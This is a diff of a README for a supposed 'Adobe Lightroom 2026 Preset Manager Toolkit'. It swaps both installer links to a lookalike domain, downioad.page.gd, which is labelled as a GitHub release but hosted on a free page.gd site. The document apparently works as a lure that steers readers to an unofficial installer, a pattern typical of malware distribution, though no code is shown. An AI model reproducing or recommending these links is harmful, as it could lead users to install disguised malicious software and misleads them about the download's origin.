@@ -2,7 +2,7 @@
 
 Introducing the Adobe Lightroom 2026 Preset Manager Toolkit, your ultimate desktop companion for mastering your photo editing workflow. This powerful utility provides a centralized hub to organize, preview, and deploy your extensive collection of Lightroom presets, profiles, brushes, and LUTs, bringing order and efficiency to your creative process.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -52,7 +52,7 @@ A: Yes, you can install and use the toolkit on multiple personal computers. The 
 
 For the latest version, features, and release notes, please download the official release package.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *Last Updated: 2026. This is a community-driven project and is not affiliated with or endorsed by Adobe Inc.*
